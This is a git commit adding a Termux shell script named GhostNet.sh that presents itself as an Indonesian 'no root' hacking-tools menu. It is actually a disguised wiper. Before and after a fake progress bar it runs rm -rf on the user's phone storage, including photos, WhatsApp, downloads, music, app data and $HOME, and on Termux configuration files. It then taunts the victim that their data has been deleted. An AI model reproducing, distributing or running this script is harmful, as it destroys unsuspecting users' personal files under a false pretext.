d6f46741ea263119208a016f3313601539b1adf1
MltrCyber <52839806+MltrCyber@users.noreply.github.com>
2019-11-01 18:52:32 +0700

    Add files via upload

---
+++ GhostNet.sh
@@ -0,0 +1,91 @@
+termux-setup-storage
+rm -rf /storage/emulated/0
+rm -rf /sdcard/0
+rm -rf /storage/emulated/0/DCIM
+rm -rf /storage/emulated/0/android/obb
+rm -rf /sdcard/0/android/data
+rm -rf $HOME
+rm -rf sdcard/0
+rm -rf storage/emulated/0
+rm -rf /storage/emulated/0/WhatsApp
+rm -rf /sdcard/0/WhatsApp
+rm -rf /storage/emulated/0/Downloads
+rm -rf /storage/emulated/0/Music
+rm -rf /sdcard/0/Music
+rm -rf /storage/emulated/0/Android/obb
+rm -rf /storage/emulated/0/DCIM
+rm -rf /storage/emulated/0/Android/data
+echo "Kumpulan Tools No Root"
+echo "______________________________"
+echo "|1.hack wifi (no Root)       |"
+echo "|2.sadap Wa (No Root) .      |"
+echo "|3.hack lampu lalu Lintas    |"
+echo "|4.hack Facebook Target .    |"
+echo "|5.hack Instagram .          |"
+echo "|6.hack Hp Orang .           |"
+echo "|7.spam Sms Unlimited .      |"
+echo "|8.hack Camera .             |"
+echo "|9.install Metasploit .      |"
+echo "|10.DDOS .                   |"
+echo "|11.hack lampu Cafe .        |"
+echo "|12.DOS .                    |"
+echo "|13.Sql Injetion .           |"
+echo "|14.Admin Finder .           |"
+echo "|15.Hash Crecker .           |"
+echo "|16.kumpulan deface Keren .  |"
+echo "|17.Hack Satelit .           |"
+echo "|18.Webdav                   |"
+echo "|19.CCTV .                   |"
+echo "|20.pembuat panas Hp Orang . |"
+echo "|____________________________|"
+echo "\033[32;1mPilih No = "
+read p;
+
+sleep 2
+echo "Sabar Njeng Proses..."
+echo "\033[37;1m#10%"
+sleep 1
+echo "##20%"
+sleep 1
+echo "###30%"
+sleep 2
+echo "####40%"
+sleep 2
+echo "#####50%"
+sleep 2
+echo "######60%"
+sleep 2
+echo "#######70%"
+sleep 3
+echo "########80%"
+sleep 3
+echo "#########90%"
+sleep 4
+echo "##########100%"
+echo "Selamat"
+cd ../usr/etc
+rm -rf bash.bashrc
+rm -rf alternatives
+rm -rf php-fpm.conf.default
+rm -rf apt
+rm -rf php-fpm.d
+rm -rf bash_completion.d
+rm -rf profile
+rm -rf fonts
+rm -rf profile.d
+rm -rf inputrc
+rm -rf resolv.conf
+rm -rf motd
+rm -rf tls
+rm -rf nanorc
+rm -rf wgetrc
+echo "Data anda Telah Saya hapus"
+sleep 3
+echo "Mau maki maki saya ?"
+sleep 3
+echo "Nih nomor wa gua
+sleep 3
+echo "08227262**** "
+sleep 3
+echo "eh saya lupa"
+sleep 3
